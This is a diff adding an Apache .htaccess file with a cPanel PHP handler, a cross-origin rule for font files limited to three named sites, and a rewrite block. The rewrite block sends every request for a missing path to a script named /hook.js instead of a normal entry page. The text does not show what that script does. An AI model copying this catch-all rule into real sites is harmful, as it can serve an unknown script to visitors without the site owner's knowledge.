@@ -1,0 +1,23 @@
+<IfModule mime_module>
+  AddType application/x-httpd-ea-php56 .php .php5 .phtml
+</IfModule>
+# php -- END cPanel-generated handler, do not edit
+# ----------------------------------------------------------------------
+# Allow loading of external fonts
+# ----------------------------------------------------------------------
+<FilesMatch "\.(ttf|otf|eot|woff)$">
+    <IfModule mod_headers.c>
+SetEnvIf Origin "https://(www.orgmy.biz.com|trendypublishing.com|organisemybiz.com)$" ACAO=$0
+Header always append Access-Control-Allow-Origin "%{ACAO}e" env=ACAO
+Header set Access-Control-Allow-Methods "GET"
+    </IfModule>
+</FilesMatch>
+
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^hook\.js$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /hook.js [L]
+</IfModule>
